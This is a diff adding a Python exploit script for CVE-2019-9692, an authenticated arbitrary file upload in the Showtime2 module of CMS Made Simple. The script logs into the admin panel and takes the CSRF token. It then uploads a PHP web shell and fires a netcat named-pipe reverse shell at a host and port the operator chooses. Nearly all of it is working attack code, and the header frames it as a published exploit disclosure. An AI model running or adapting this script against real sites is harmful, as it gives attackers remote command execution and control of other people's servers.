@@ -1,0 +1,75 @@
+#!/usr/bin/env python
+# Exploit Title: CMS Made Simple (authenticated) arbitrary file upload in Showtime2 module
+# Date: March 2019
+# Exploit Author: Daniele Scanu @ Certimeter Group
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: http://viewsvn.cmsmadesimple.org/listing.php?repname=showtime2
+# Version: Showtime2 module <= 3.6.2
+# Tested on: CMS Made Simple 2.2.8 in Ubuntu 18.04
+# CVE : 2019-9692
+
+import requests
+import optparse
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+parser = optparse.OptionParser()
+parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://192.168.1.10/cms)")
+parser.add_option('-U', '--username', action="store", dest="username", help="Username for login", default="admin")
+parser.add_option('-P', '--password', action="store", dest="password", help="Password for login", default="password")
+parser.add_option('-l', '--local', action="store", dest="local", help="Local uri for reverse shell", default="localhost")
+parser.add_option('-p', '--port', action="store", dest="port", help="Local port for reverse shell", default="2222")
+options, args = parser.parse_args()
+
+if not options.url:
+    print "[-] Specify an uri target"
+    exit()
+
+if not options.username:
+    print "[-] Specify an username for login in administrator panel"
+    exit()
+
+if not options.password:
+    print "[-] Specify a password for login in administrator panel"
+    exit()
+
+base_uri = options.url
+url_login = base_uri + "/admin/login.php"
+user = options.username
+password = options.password
+session = requests.Session()
+__c_var = ""
+lhost = options.local
+lport = options.port
+
+# Login in administrator panel for get the csrf token
+def login(username, password):
+    print "[*] Login to cms"
+    global __c_var
+    credentials = {"username": username, "password": password, "loginsubmit": "Submit"}
+    response = session.post(url_login, data=credentials, allow_redirects=False)
+    __c_var = response.headers['Location'].split("__c=")[1]
+    print "[*] Token value: " + __c_var
+
+# upload a php script with reverse shell in vulnerable functionality
+def upload_shell():
+    print "[*] Uploading webshell"
+    multipart_data = MultipartEncoder(
+        fields = {
+            'm1_input_browse': ('shell.php', "<?php system($_REQUEST['cmd']); ?>", 'text/plain'),
+            '__c': __c_var,
+            'mact': 'Showtime2,m1_,defaultadmin,0',
+            'm1_upload_submit': 'Upload'
+        }
+    )
+    response = session.post(base_uri + '/admin/moduleinterface.php', data=multipart_data,
+                      headers={'Content-Type': multipart_data.content_type})
+
+# Call the script uploaded for spawn a reverse shell
+def spawn_shell():
+    print "[*] Spawn a shell to " + lhost + ":" + str(lport)
+    payload = {"cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + lhost + " " + str(lport) + " >/tmp/f"}
+    requests.post(base_uri + "/uploads/images/shell.php", data=payload)
+
+login(user, password)
+upload_shell()
+spawn_shell()
